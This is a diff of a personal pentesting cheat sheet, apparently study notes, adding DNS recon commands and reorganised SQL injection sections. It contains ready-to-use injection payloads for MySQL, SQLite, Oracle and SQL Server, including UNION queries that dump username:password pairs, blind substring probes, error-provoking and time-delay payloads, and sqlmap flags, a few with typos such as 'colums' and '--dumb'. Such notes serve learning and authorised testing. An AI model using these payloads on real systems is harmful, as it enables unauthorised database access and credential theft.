@@ -7,6 +7,7 @@
   - [Recoinaissance](#recoinaissance)
 - [Basic Enum](#basic-enum)
 - [Web hacking](#web-hacking)
+  - [passive](#passive)
   - [Subdomain](#subdomain)
   - [Wildcards](#wildcards)
   - [User enumeration](#user-enumeration)
@@ -20,6 +21,9 @@
     - [UNION](#union)
       - [Find data oracle](#find-data-oracle)
     - [blind](#blind)
+      - [binary](#binary)
+        - [sqlmap](#sqlmap)
+        - [Provoking errors](#provoking-errors)
 - [burpsuite](#burpsuite)
   - [Repeater](#repeater)
   - [Intruder](#intruder)
@@ -110,6 +114,12 @@
 
 # Web hacking
 
+## passive
+- whois
+- nslookup -type=?? URL SERVER
+- dig SERVER URL TYPE
+- 
+
 ## Subdomain
 - search certificates: 
   - https://transparencyreport.google.com/https/overview
@@ -118,6 +128,8 @@
     - curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-certspotter.txt
 - Google search engine: site:*.domain.com
 - dnsrecon
+- dnsdumpster => online
+
 
  
 ## Wildcards 
@@ -211,10 +223,14 @@ Insecure Direct Object Request
 - find db = '0 union 1,2,database()-- -
 - find tables = '0 union select  1,2,group_concat(table_name) FROM information_schema.tables where table_schema='db_name'
   -  information_schema = info about all databases and tables
-
 - find columns: 0 union select  1,2,group_concat(column_name) FROM information_schema.columns where table_name= 'table_name'-- -
 - content: '0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
-- 
+
+- SQLITE 
+  - exist vuln: ' UNION SELECT 1,2'
+  - find tables: ' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT LIKE 'sqlite_%''
+  - find columns: ' UNION SELECT 1,group_concat(column_name) FROM table_name '
+  - find content: ' UNION SELECT 1,group_concat(column1 || '-' || column2) FROM table_name '
   
 - Find version (always UNION)
   - Microsoft, MySQL	SELECT @@version
@@ -230,15 +246,6 @@ Show columns: '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_n
 Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table-- 
 
 ### blind
-- binary
-  - like a% = starting with a
-  - Find DB name: ' UNION SELECT, NULL,NULL,NULL where database() like '%a' 
-  - Find table name: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.tables** WHERE **table_schema**='name_db' AND **table_name** like '[]%';--
-  - find columns 1: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%';--
-  - find columns 2: ' UNION SELECT NULL,NULL,[sleep(4)]|NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%' AND column_name!='found 1';--
-  - find content: ' UNION SELECT NULL,NULL,NULL FROM **table_name** where **column_1** like 'a%';--
-
-
 - Change SQL Command in the trackinID + test
 - Table exists: ' AND (SELECT 'a' FROM users LIMIT 1)='a;
 - Size of string: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a;==> payload type number to find 1 until n
@@ -249,7 +256,21 @@ Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table--
     - LIMIT start,from_total ==> LIMIT 0,1 = first, from total 1 || LIMIT 0,2 start 0 from total 2
   - SUBSTRING((SELECT column FROM table_name LIMIT 0,1)0,1)
 
-- with sqlmap
+#### binary
+- like a% = starting with a
+- Find DB name: ' UNION SELECT, NULL,NULL,NULL where database() like '%a' 
+- Find table name: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.tables** WHERE **table_schema**='name_db' AND **table_name** like '[]%';--
+- find columns 1: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%';--
+- find columns 2: ' UNION SELECT NULL,NULL,[sleep(4)]|NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%' AND column_name!='found 1';--
+- find content: ' UNION SELECT NULL,NULL,NULL FROM **table_name** where **column_1** like 'a%';--
+
+- individual charachter + size
+  - ' AND (SELECT 'a' FROM [table]  WHERE [column]='value' AND LENGTH(value)>§1§)='a;==> payload type number to find 1 until n
+  -(SQLITE): [known_value]' AND length((SELECT [column] FROM [table] WHERE [column]='value'))==37-- -
+ - find substring SQLITE: admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
+ 
+ ##### sqlmap
+- sqlmap
   - -u = url
   - --data="id=123&password=123"
   - --level= ??
@@ -257,6 +278,30 @@ Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table--
   - --dbms=type of db
   - --technique=???
   - --dumb
+
+##### Provoking errors
+- Oracle
+  - xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+    - case = false  ==> no error produced
+    - TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' = FALSE ==> execute after ELSE query
+      - Condition = TRUE ==> forced error 1/0
+      - Condition = FALSE ==> goes to 2nd question and asks if the info about the db is correct
+
+  - xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+    - case = true ==> error will be produced
+    - TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' = TRUE ==> produce error that is processed by the query
+
+- time
+  - with sleep() ==> success if the function is executed
+  - admin123' UNION SELECT SLEEP(5),1,x,y,z;--
+  - similar to blind
+  - admin123' UNION SELECT 1,SLEEP(5) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password%' and COLUMN_NAME!='username';--
+  
+  - Microsoft: 
+    - '; IF (1=2) WAITFOR DELAY '0:0:10'-- = false, will springt action
+    - '; IF (1=1) WAITFOR DELAY '0:0:10'-- = true, action
+
+
 
 
 - in the intruder: substring method with password list
@@ -266,11 +311,6 @@ Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table--
  - Brute_force: iterate over given list
 
 
-- time
-  - with sleep() ==> success if the function is executed
-  - admin123' UNION SELECT SLEEP(5),1,x,y,z;--
-  - similar to blind
-  - admin123' UNION SELECT 1,SLEEP(5) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password%' and COLUMN_NAME!='username';--
 
 
 - Known table, columns:
